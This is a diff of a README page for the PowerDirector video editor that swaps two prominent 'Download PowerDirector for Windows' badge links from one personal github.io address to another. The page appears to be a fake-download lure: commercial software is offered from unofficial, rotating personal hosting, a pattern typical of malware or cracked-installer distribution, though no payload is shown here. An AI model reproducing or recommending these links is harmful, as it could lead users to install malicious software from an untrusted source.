@@ -16,7 +16,7 @@ PowerDirector is a video editing app for Windows that makes editing approachable
 <div align="center">
   <h3>Powerful editing made easy on your PC</h3>
 
-  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://zanssceo.github.io/.github/PowerDirector-App-For-PC)
+  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://williamgonzales69.github.io/.github/PowerDirector-App-For-PC)
 
 </div>
 
@@ -90,7 +90,7 @@ For help with PowerDirector, open the built-in Help or Support section inside th
 <div align="center">
   <h3>Ready to get started with PowerDirector?</h3>
 
-  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://zanssceo.github.io/.github/PowerDirector-App-For-PC)
+  [![Download PowerDirector](https://img.shields.io/badge/⬇_Download_PowerDirector_for_Windows-2962FF?style=for-the-badge)](https://williamgonzales69.github.io/.github/PowerDirector-App-For-PC)
 
 </div>
 
